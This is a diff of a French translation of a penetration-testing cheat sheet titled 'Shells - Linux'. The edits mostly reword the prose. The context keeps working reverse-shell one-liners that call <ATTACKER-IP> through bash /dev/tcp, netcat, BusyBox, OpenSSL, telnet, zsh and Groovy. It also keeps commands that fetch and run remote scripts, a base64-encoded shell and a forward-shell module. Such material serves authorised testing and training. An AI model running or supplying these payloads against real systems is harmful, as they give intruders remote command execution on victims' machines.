@@ -1,12 +1,14 @@
 # Shells - Linux
 
+{{#include ../../banners/hacktricks-training.md}}
+
 **Si vous avez des questions concernant l'un de ces shells, vous pouvez les vérifier avec** [**https://explainshell.com/**](https://explainshell.com/).<sup>[[9]](#references)</sup>
 
 ## Full TTY
 
-**Une fois que vous avez obtenu un reverse shell**[ **lisez cette page pour obtenir un Full TTY**](full-ttys.md)**.**
+**Une fois que vous obtenez un reverse shell**, [**lisez cette page pour obtenir un Full TTY**](full-ttys.md)**.**
 
-Les payloads de reverse shell de base répertoriés ci-dessous sont également documentés dans les cheat sheets de HighOn.Coffee et PayloadsAllTheThings ; vérifiez la disponibilité de l'interpréteur et des utilitaires sur la cible avant d'en sélectionner un.<sup>[[1]](#references)[[4]](#references)</sup>
+Les payloads de reverse shell de base présentés ci-dessous sont également documentés dans les cheat sheets de HighOn.Coffee et de PayloadsAllTheThings ; vérifiez la disponibilité de l'interpréteur et des utilitaires sur la cible avant d'en sélectionner un.<sup>[[1]](#references)[[4]](#references)</sup>
 
 ## Bash | sh
 ```bash
@@ -23,7 +25,7 @@ exec >&0
 ```
 N'oubliez pas de vérifier avec d'autres shells : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh et bash.
 
-### Shell sûr vis-à-vis des symboles
+### Shell sécurisé pour les symboles
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -34,13 +36,13 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 ```
 #### Explication du shell
 
-Les points suivants résument le comportement documenté de Bash en mode interactif et en matière de redirection :<sup>[[10]](#references)[[11]](#references)</sup>
+Les points suivants résument le comportement documenté de Bash en matière d'interactivité et de redirection :<sup>[[10]](#references)[[11]](#references)</sup>
 
 1. **`bash -i`** : Cette partie de la commande démarre un shell Bash interactif (`-i`).
-2. **`>&`** : Cette partie de la commande est une notation abrégée permettant de **rediriger à la fois la sortie standard** (`stdout`) et **l'erreur standard** (`stderr`) vers la **même destination**.
+2. **`>&`** : Cette partie de la commande est une notation abrégée pour **rediriger à la fois la sortie standard** (`stdout`) et **l'erreur standard** (`stderr`) vers la **même destination**.
 3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`** : Il s'agit d'un fichier spécial qui **représente une connexion TCP vers l'adresse IP et le port spécifiés**.
 - En **redirigeant les flux de sortie et d'erreur vers ce fichier**, la commande envoie effectivement la sortie de la session du shell interactif vers la machine de l'attaquant.
-4. **`0>&1`** : Cette partie de la commande **redirige l'entrée standard** (`stdin`) vers la même destination que la sortie standard (`stdout`).
+4. **`0>&1`** : Cette partie de la commande **redirige l'entrée standard (`stdin`) vers la même destination que la sortie standard (`stdout`)**.
 
 ### Créer dans un fichier et exécuter
 ```bash
@@ -49,9 +51,9 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Forward Shell
 
-Lorsqu'un RCE est disponible, mais qu'un reverse shell est bloqué par un firewall, le NAT ou un filtrage sortant, un forward shell via le canal RCE peut fournir une session semi-interactive.<sup>[[12]](#references)</sup>
+Lorsqu’une RCE est disponible, mais qu’un reverse shell est bloqué par un firewall, le NAT ou un filtrage sortant, un forward shell via le canal RCE peut fournir une session semi-interactive.<sup>[[12]](#references)</sup>
 
-Un outil recommandé à cette fin est [toboggan](https://github.com/n3rada/toboggan.git), qui encapsule une primitive d'exécution de commandes dans une session interactive.<sup>[[12]](#references)</sup>
+Un outil recommandé à cette fin est [toboggan](https://github.com/n3rada/toboggan.git), qui encapsule une primitive d’exécution de commandes dans une session interactive.<sup>[[12]](#references)</sup>
 
 Pour utiliser toboggan, créez un module Python adapté au contexte RCE de votre système cible ; son interface de module attend une fonction `execute(command, timeout)` qui renvoie la sortie de la commande.<sup>[[12]](#references)</sup> Par exemple, un module nommé `nix.py` pourrait être structuré comme suit :
 ```python3
@@ -77,7 +79,7 @@ response.raise_for_status()
 
 return response.text
 ```
-Exécutez le module avec la syntaxe actuelle de la ligne de commande de toboggan:<sup>[[12]](#references)</sup>
+Exécutez le module avec la syntaxe actuelle de la ligne de commande de toboggan :<sup>[[12]](#references)</sup>
 ```shell
 toboggan nix.py
 ```
@@ -91,7 +93,7 @@ Vous devez modifier les éléments suivants :<sup>[[13]](#references)</sup>
 - Le préfixe et le suffixe de votre payload (le cas échéant)
 - La manière dont le payload est envoyé (headers ? data ? informations supplémentaires ?)
 
-Ensuite, vous pouvez **envoyer des commandes** ou utiliser la commande **`upgrade`** pour obtenir un PTY complet ; l’implémentation interroge la sortie à un intervalle approximatif de 1,3 seconde.<sup>[[13]](#references)</sup>
+Ensuite, vous pouvez **envoyer des commandes** ou utiliser la **commande `upgrade`** pour obtenir un PTY complet ; l’implémentation interroge la sortie à un intervalle approximatif de 1,3 seconde.<sup>[[13]](#references)</sup>
 
 ## Netcat
 ```bash
@@ -103,19 +105,19 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <
 ```
 ## BusyBox
 
-BusyBox regroupe de nombreux utilitaires en un seul petit exécutable et est courant sur les systèmes Linux de petite taille ou embarqués. S'il n'y a pas de `nc` autonome, vérifiez si BusyBox l'expose :<sup>[[8]](#references)[[19]](#references)</sup>
+BusyBox regroupe de nombreux utilitaires dans un seul petit exécutable et est courant sur les systèmes Linux de petite taille ou embarqués. S'il n'y a pas de `nc` autonome, vérifiez si BusyBox l'expose&nbsp;:<sup>[[8]](#references)[[19]](#references)</sup>
 ```bash
 busybox --list-full | grep -E '(^|/)nc$'
 busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
 busybox nc <ATTACKER-IP> <PORT> -e sh
 ```
-Si `busybox nc` existe mais que l'exécution interactive est instable, adaptez le modèle FIFO de la section `nc` à cette applet :<sup>[[2]](#references)[[8]](#references)</sup>
+Si `busybox nc` existe mais que l’exécution interactive est instable, adaptez le modèle FIFO de la section `nc` à cet applet :<sup>[[2]](#references)[[8]](#references)</sup>
 ```bash
 rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
 ```
 ## gsocket
 
-Consultez les instructions officielles de déploiement à l’adresse [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/).<sup>[[14]](#references)</sup>
+Consultez les instructions officielles de déploiement sur [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/).<sup>[[14]](#references)</sup>
 ```bash
 bash -c "$(curl -fsSL gsocket.io/x)"
 ```
@@ -132,7 +134,7 @@ rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-I
 ```bash
 while true; do nc -l <port>; done
 ```
-Utilisez la même séquence de saisie Enter/CTRL+D décrite dans la section Whois.<sup>[[3]](#references)</sup>
+Utilisez la même séquence d’entrée Enter/CTRL+D que celle décrite dans la section Whois.<sup>[[3]](#references)</sup>
 
 **Victime**
 ```bash
@@ -240,7 +242,7 @@ zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPL
 ```
 ## Rustcat (rcat)
 
-[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – listener moderne semblable à netcat, écrit en Rust.<sup>[[5]](#references)</sup>
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – listener moderne similaire à netcat, écrit en Rust.<sup>[[5]](#references)</sup>
 ```bash
 # Attacker – interactive listener with history & tab-completion
 rcat listen -ib 55600
@@ -251,12 +253,12 @@ curl -L https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-l
 && /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
 ```
 Fonctionnalités documentées par le projet :<sup>[[5]](#references)</sup>
-- Historique des commandes et complétion par tabulation en mode interactif
+- Historique des commandes et complétion avec la touche Tab en mode interactif
 - `-s` pour sélectionner l’exécutable du shell utilisé par `connect`
 
 ## pwncat-cs
 
-Si vous disposez déjà d’un **raw reverse shell**, mais que vous souhaitez un listener capable de configurer une session plus utilisable, `pwncat-cs` peut gérer la connexion et tenter d’obtenir un PTY distant.<sup>[[7]](#references)</sup>
+Si vous disposez déjà d’un **raw reverse shell** mais souhaitez un listener capable de configurer une session plus utilisable, `pwncat-cs` peut gérer la connexion et tenter d’établir un PTY distant.<sup>[[7]](#references)</sup>
 ```bash
 # Attacker - catch a plain reverse shell and auto-upgrade it when possible
 python3 -m pip install --user pwncat-cs
@@ -265,11 +267,11 @@ pwncat-cs -lp 4444
 # Victim - reuse any payload from this page
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
 ```
-Il prend également en charge les canaux `ssl-bind` et `ssl-connect` **chiffrés**, ce qui vous permet de l'associer à des payloads `ncat --ssl` ou `socat OPENSSL:` lorsque vous avez besoin du chiffrement du transport.<sup>[[7]](#references)</sup>
+Il prend également en charge les channels `ssl-bind` et `ssl-connect` **chiffrés**, ce qui permet de l'associer à des payloads `ncat --ssl` ou `socat OPENSSL:` lorsque le chiffrement du transport est nécessaire.<sup>[[7]](#references)</sup>
 
 ## revsh (chiffré et prêt pour le pivot)
 
-`revsh` est un client/serveur C compact qui fournit un TTY complet sur un **tunnel Diffie-Hellman chiffré** et peut éventuellement attacher une interface **TUN/TAP** pour un pivoting inverse de type VPN.<sup>[[6]](#references)</sup>
+`revsh` est un client/serveur C minimal qui fournit un TTY complet sur un **tunnel Diffie-Hellman chiffré** et peut éventuellement se connecter à une interface **TUN/TAP** pour un pivoting inverse de type VPN.<sup>[[6]](#references)</sup>
 ```bash
 # Build after preparing the OpenSSL dependency as described in the repository README
 git clone https://github.com/emptymonkey/revsh && cd revsh && make
@@ -281,7 +283,7 @@ revsh -c 0.0.0.0:443
 ./revsh <ATTACKER-IP>:443
 ```
 Les options utiles documentées par `revsh` incluent :<sup>[[6]](#references)</sup>
-- `-b` : mode bind-shell (activez-le aux deux extrémités)
+- `-b` : mode bind-shell (à activer aux deux extrémités)
 - `-D [LHOST:]LPORT` ou `-B [RHOST:]RPORT` : forwarding dynamique SOCKS 4/4a/5
 - `-x` : désactive la configuration automatique des proxies, y compris la configuration TUN/TAP par défaut
 
@@ -304,7 +306,7 @@ mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATT
 #If the target needs SNI / hostname validation to blend with a fronted TLS service
 mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -servername <DOMAIN> -verify_return_error -verify_hostname <DOMAIN> -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
 ```
-Vous pouvez toujours utiliser le pattern classique **two-listener** lorsque vous souhaitez séparer les canaux d’entrée et de sortie.<sup>[[16]](#references)[[17]](#references)</sup>
+Vous pouvez toujours utiliser le pattern classique **two-listener** lorsque vous souhaitez des canaux d’entrée/sortie séparés.<sup>[[16]](#references)[[17]](#references)</sup>
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -373,7 +375,7 @@ Cela tentera de se connecter à votre système sur le port 6001.<sup>[[2]](#refe
 ```bash
 xterm -display 10.0.0.1:1
 ```
-Pour intercepter le reverse shell, utilisez un serveur X à l’écoute sur le port 6001, comme indiqué ci-dessous.<sup>[[2]](#references)</sup>
+Pour intercepter le reverse shell, utilisez un serveur X à l'écoute sur le port 6001, comme indiqué ci-dessous.<sup>[[2]](#references)</sup>
 ```bash
 # Authorize host
 xhost +targetip
@@ -382,7 +384,7 @@ Xnest :1
 ```
 ## Groovy
 
-par [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76). REMARQUE : Le reverse shell Java fonctionne également pour Groovy.<sup>[[18]](#references)</sup>
+par [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76). NOTE : Les reverse shells Java fonctionnent également avec Groovy.<sup>[[18]](#references)</sup>
 ```bash
 String host="localhost";
 int port=8044;
@@ -391,23 +393,23 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 ```
 ## References
 
-- [1] [Reverse Shell Cheat Sheet : PHP, ASP, Netcat, Bash et Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
-- [2] [Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+- [1] [Aide-mémoire Reverse Shell : PHP, ASP, Netcat, Bash & Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
+- [2] [Aide-mémoire Reverse Shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 - [3] [Utiliser Whois et Finger pour les Reverse Shells](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
-- [4] [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
-- [5] [rustcat - L'écouteur de ports moderne et le reverse shell](https://github.com/robiot/rustcat)
-- [6] [revsh - Un reverse shell avec prise en charge du terminal, tunneling de données et capacités avancées de pivoting](https://github.com/emptymonkey/revsh)
+- [4] [PayloadsAllTheThings - Aide-mémoire Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [5] [rustcat - Le port listener et Reverse Shell moderne](https://github.com/robiot/rustcat)
+- [6] [revsh - Un Reverse Shell avec prise en charge du terminal, tunneling de données et capacités avancées de pivoting](https://github.com/emptymonkey/revsh)
 - [7] [pwncat (pwncat-cs) - plateforme de post-exploitation](https://github.com/calebstewart/pwncat)
 - [8] [busybox | GTFOBins](https://gtfobins.org/gtfobins/busybox/)
 - [9] [explainshell.com](https://explainshell.com/)
-- [10] [Manuel de référence de Bash : redirections](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
-- [11] [Manuel de référence de Bash : invoquer Bash](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
+- [10] [Manuel de référence de Bash : Redirections](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
+- [11] [Manuel de référence de Bash : Invocation de Bash](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
 - [12] [toboggan](https://github.com/n3rada/toboggan)
 - [13] [forward-shell](https://github.com/IppSec/forward-shell)
 - [14] [Instructions de déploiement de Global Socket](https://www.gsocket.io/deploy/)
 - [15] [openssl-req](https://docs.openssl.org/4.0/man1/openssl-req/)
 - [16] [openssl-s_server](https://docs.openssl.org/master/man1/openssl-s_server/)
 - [17] [openssl-s_client](https://docs.openssl.org/master/man1/openssl-s_client/)
-- [18] [Reverse Shell pur en Groovy/Java](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
+- [18] [Reverse Shell Pure Groovy/Java](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
 - [19] [BusyBox](https://busybox.net/about.html)
 {{#include ../../banners/hacktricks-training.md}}
